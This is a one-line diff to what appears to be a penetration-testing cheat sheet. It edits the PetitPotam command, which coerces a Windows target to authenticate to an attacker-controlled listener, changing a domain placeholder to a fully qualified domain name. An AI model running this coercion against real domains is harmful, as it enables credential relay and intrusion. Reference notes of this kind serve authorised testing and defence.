@@ -6,7 +6,7 @@
 #plateform/linux  #target/remote #cat/ATTACK/COERCE
 https://github.com/topotam/PetitPotam
 ```
-PetitPotam.py -u <user> -p '<password>' -d <domain> <listener_ip> <target_ip>
+PetitPotam.py -u <user> -p '<password>' -d <domain_fqdn> <listener_ip> <target_ip>
 ```
 
 ## coerce to auth over HTTP
